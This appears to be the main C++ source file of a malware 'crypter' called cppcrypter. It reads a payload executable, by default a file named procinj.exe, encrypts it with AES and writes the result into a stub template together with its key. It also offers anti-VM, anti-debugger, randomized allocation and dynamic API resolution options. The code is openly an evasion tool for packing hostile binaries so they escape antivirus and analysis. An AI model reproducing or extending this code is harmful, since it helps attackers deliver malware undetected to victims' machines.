#include <iostream>
#include <cstring>
#include <vector>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <fstream>
#include "utils.h"
#include <iomanip>
#include <filesystem>

using namespace std;
namespace fs = std::filesystem;

const int FLAG_COUNT = 4;
bool flags[FLAG_COUNT] = {false};
enum flags{
    RAND,
    VM,
    DB,
    DYN
};

void display(){
    cout << "\nUsage: ./main.exe [options]\nOptions:\n";
    cout << "\t-h, --help                 show all options\n";
    cout << "\t-p                         show default paths for payload, stub output, and stub template\n";
    cout << "\t--payload <C:\\\\path>       specify payload\n";
    cout << "\t--stub <C:\\\\path>          specify payload\n";
    cout << "\t--rand                     enable random memory allocations\n";
    cout << "\t--vm                       enable anti-VM mode\n";
    cout << "\t--db                       enable anti-debugger mode\n";
    cout << "\t--dyn                      enable dynamic API call resolution\n";
    cout << "\tFlags must be specified individually\n";
}


void parseArgs(int argc, char* argv[], string *path_to_payload, string *path_to_output_dir, string *path_to_stub_template){

    if (argc == 1){
        cout << "\nNo arguments provided. Writing default stub...\n";
        return;
    }

    for(int i = 1; i < argc; i++){
        if(strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0){
            display();
            exit(0);
        } else if(strcmp(argv[i], "-p") == 0){
            cout << "\nPaths:\n\tPath to payload: " << *path_to_payload << "\n\tPath to output directory: " << *path_to_output_dir << "\n\tPath to stub template: " << *path_to_stub_template;
            exit(0);

        } else if(strcmp(argv[i], "--payload") == 0){
            if(i + 1 >= argc){
                cerr << "No path to payload specified\n\tUsage: ./main --payload \"C:\\\\path\\\\to\\\\payload\"\n";
                display();
                exit(1);
            }
            if(!filesystem::exists(argv[i+1])){
                cerr << "Invalid payload path: " << argv[i+1] << "\n";
                display();
                exit(1);
            } else if (!filesystem::is_regular_file(argv[i+1])){
                cerr << "Invalid payload path: " << argv[i+1] << "\n";
                display();
                exit(1);
            } else {
                *path_to_payload = argv[i+1];
                cout << "Payload set to: " << *path_to_payload << "\n";
                continue;
            }
        } else if(strcmp(argv[i], "--stub") == 0){
            if(i + 1 >= argc){
                cerr << "No path to stub template specified\n\tUsage: ./main --stub \"C:\\\\path\\\\to\\\\stub\\\\template\"\n";
                display();
                exit(1);
            }
            if(!filesystem::exists(argv[i+1])){
                cerr << "Invalid stub template path: " << argv[i+1] << "\n";
                display();
                exit(1);
            } else if (!filesystem::is_regular_file(argv[i+1])){
                cerr << "Invalid stub template path: " << argv[i+1] << "\n";
                display();
                exit(1);
            } else {
                *path_to_stub_template = argv[i+1];
                cout << "Stub template set to: " << *path_to_stub_template << "\n";
                continue;
            }
        } else if (strcmp(argv[i], "--rand") == 0){
            flags[RAND] = true;
            cout << "Stub randomization mode enabled\n";
            continue;
        } else if(strcmp(argv[i], "--vm") == 0){
            flags[VM] = true;
            cout << "Anti-VM mode enabled\n";
            continue;
        } else if(strcmp(argv[i], "--db") == 0){
            flags[DB] = true;
            cout << "Anti-Debugger mode enabled\n";
            continue;
        } else if(strcmp(argv[i], "--dyn") == 0){
            flags[DYN] = true;
            cout << "Dynamic API call resolution enabled\n";
            continue;
        }
    }
}

int main(int argc, char * argv[]){

    fs::path executable_path = fs::absolute(argv[0]);
    fs::path base_path = executable_path.parent_path().parent_path()/"cppcrypter";  // Assuming the executable is two levels deep from the base path

    // change to bin.exe when procinj is removed 
    string path_to_payload = (base_path / "bin" / "procinj.exe").string();
    string path_to_output_dir = (base_path / "stub").string() + "\\";
    string path_to_stub_template = (base_path / "resource\\stub.cpp").string();

    parseArgs(argc, argv, &path_to_payload, &path_to_output_dir, &path_to_stub_template);

    // reading bytes of payload
    vector<unsigned char> buf = readBinary(path_to_payload);
    if(buf.empty()){
        cerr << "empty binary\n";
        return 1;
    }

    // key and IV gen
    auto [key, iv] = generateKeyAndIV(AES_BLOCK_SIZE, AES_BLOCK_SIZE);
    vector<unsigned char> payloadBytes = encrypt(buf, key, iv);
    writeStub(flags, path_to_stub_template, path_to_output_dir, payloadBytes, key, iv);

    return 0;
}
